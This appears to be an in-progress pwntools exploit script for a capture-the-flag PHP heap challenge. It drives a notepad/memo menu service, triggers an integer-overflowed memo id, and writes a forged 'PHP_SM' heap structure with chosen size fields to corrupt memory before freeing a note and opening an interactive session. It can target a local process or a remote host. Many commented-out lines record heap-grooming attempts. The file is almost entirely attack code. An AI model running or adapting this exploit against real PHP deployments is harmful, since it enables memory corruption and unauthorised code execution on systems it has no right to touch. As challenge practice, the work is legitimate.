#!/usr/bin/env python
from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
from time import sleep

context.binary = e = ELF("php8.1")
libc = e.libc
gs = """
"""


def start():
    if args.LOCAL:
        p = e.process(["chall.php"])
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = r = start()


def choice(c: int):
    r.sendlineafter(b'> ', str(c).encode())


def open_note(notepad_id, size: int):
    choice(1)
    r.sendlineafter(b'Notepad id: ', str(notepad_id).encode())
    r.sendlineafter(b'Size: ', str(size).encode())


def view_note(notepad_id):
    choice(4)
    r.sendlineafter(b'Note id: ', str(notepad_id).encode())


def delete_note(notepad_id):
    choice(5)
    r.sendlineafter(b'Note id: ', str(notepad_id).encode())


def edit_note(notepad_id: int, contents: bytes):
    choice(3)
    r.sendlineafter(b'Note id: ', str(notepad_id).encode())
    r.sendlineafter(b'Note contents: ', contents)


def add_memo(memo_id: int, size: int):
    choice(6)
    r.sendlineafter(b'Memo id: ', str(memo_id).encode())
    r.sendlineafter(b'Size: ',  str(size).encode())


def view_memo():
    choice(8)


def delete_memo():
    choice(9)


def edit_memo(contents):
    choice(7)
    r.sendlineafter(b'Memo contents: ', contents)


# delete_memo()
# add_memo(1, 0xb8)
open_note(1, 0x200)
pause()
add_memo(2**32 + 1, 0xff)
# edit_note(1235, b'%p')

edit_note(1, b'C' * 16)
# edit_note(6, b'A' * 16)
# edit_note(2, b'C' * 1)


pl = b'PHP_SM\0\0'
pl += p64(0x28) + p64(0x600) + p64(0x1a00) + \
    p64(0x2000) + p64(0x1) + p64(0x1008) + p64(0x1028)
edit_memo(pl)

edit_note(2, b'B' * 0x20)
delete_note(1)

# edit_note(1, b'PHP_SM\0\0')
# edit_note(2, b'A' * 0x6600)
# edit_memo(b'A' * 10000)
# edit_note(2, b'A' * 264)
# delete_note(1)
# delete_note()
# edit_note(1235, b'')
# for i in range(71):
#    edit_note(1200 + i, b'\0' * 0x700)
# delete_note(1201)
# edit_note(1280, b'\0' * 0x1400)
# delete_note(1202)
# add_memo(1201, 255)
# edit_note(1234, b'A' * 1500)
r.interactive()
